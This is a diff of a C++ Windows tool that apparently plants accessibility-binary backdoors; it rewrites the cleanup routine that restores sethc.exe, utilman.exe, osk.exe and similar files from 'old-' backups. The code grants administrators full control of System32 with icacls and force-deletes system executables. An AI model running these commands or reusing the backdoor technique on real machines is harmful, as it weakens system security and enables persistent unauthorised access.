@@ -138,34 +138,52 @@ void enableAnsi() {
 }
 
 void cleanup() {
-    //searches through system32 to find previously-run backdoors
-    system("dir C:\\Windows\\System32\\old-*.* /b /s > C:\\Windows\\System32\\old_files.txt 2> nul");
-    std::vector<std::string> replacedExecutables;
-    std::ifstream file("C:\\Windows\\System32\\old_files.txt");
-    std::string line;
+    // Give System32 admin perms (if needed)
+    error_handling(system("icacls C:\\Windows\\System32\\ /grant administrators:F >nul 2>&1"), "Grant admin permissions to System32");
 
-    //reads each line from the file and add to the vector
-    while (std::getline(file, line)) {
-        replacedExecutables.push_back(line);
-    }
-    file.close();
+    // List of backup-original pairs
+    std::vector<std::pair<std::string, std::string>> files = {
+        {"old-sethc.exe", "sethc.exe"},
+        {"old-utilman.exe", "utilman.exe"},
+        {"old-narrator.exe", "narrator.exe"},
+        {"old-osk.exe", "osk.exe"},
+        {"old-magnify.exe", "magnify.exe"},
+        {"old-displayswitch.exe", "displayswitch.exe"}
+    };
 
-    //restores original executables by renaming old-* files back to their original names
-    //also deletes previous backdoor executables
-    for (const std::string& executable : replacedExecutables) {
-        std::string original = executable;
-        original.replace(executable.find("old-"), 4, "");
-        //deletes previous backdoors
-        std::string delCommand = "del " + original;
-        //std::cout << delCommand << std::endl; testing
-        error_handling(system(delCommand.c_str()), delCommand.c_str());
-        //restores original executables
-        std::string renameCommand = "move \"" + executable + "\" \"" + original + "\"";
-        //std::cout << renameCommand << std::endl; testing
-        error_handling(system((renameCommand + " > nul 2>&1").c_str()), renameCommand.c_str());
-        std::cout << "\033[1;32m\tRemoved Previous Backdoor\033[0m" << std::endl;
+    for (const auto& filePair : files) {
+        const std::string& backup = filePair.first;
+        const std::string& original = filePair.second;
+
+        std::string backupPath = "C:\\Windows\\System32\\" + backup;
+        std::string originalPath = "C:\\Windows\\System32\\" + original;
+
+        // Check if backup file exists
+        if (GetFileAttributesA(backupPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+            std::cout << "\033[1;33m\tBackup file not found: " << backup << "\033[0m" << std::endl;
+            continue;
+        }
+
+        // Delete the current file if it exists
+        if (GetFileAttributesA(originalPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
+            std::string delCmd = "del /f \"" + originalPath + "\" >nul 2>&1";
+            if (system(delCmd.c_str())) {
+                std::cout << "\033[1;31m\tFailed to delete: " << original << "\033[0m" << std::endl;
+                continue;
+            }
+        }
+
+        // Restore the backup
+        std::string moveCmd = "move /y \"" + backupPath + "\" \"" + originalPath + "\" >nul 2>&1";
+        if (system(moveCmd.c_str())) {
+            std::cout << "\033[1;31m\tFailed to restore: " << backup << " to " << original << "\033[0m" << std::endl;
+        }
+        else {
+            std::cout << "\033[1;32m\tSuccessfully restored: " << original << "\033[0m" << std::endl;
+        }
     }
 }
+
 
 void sticky_keys() {
     //makes sure that sticky keys is turned on
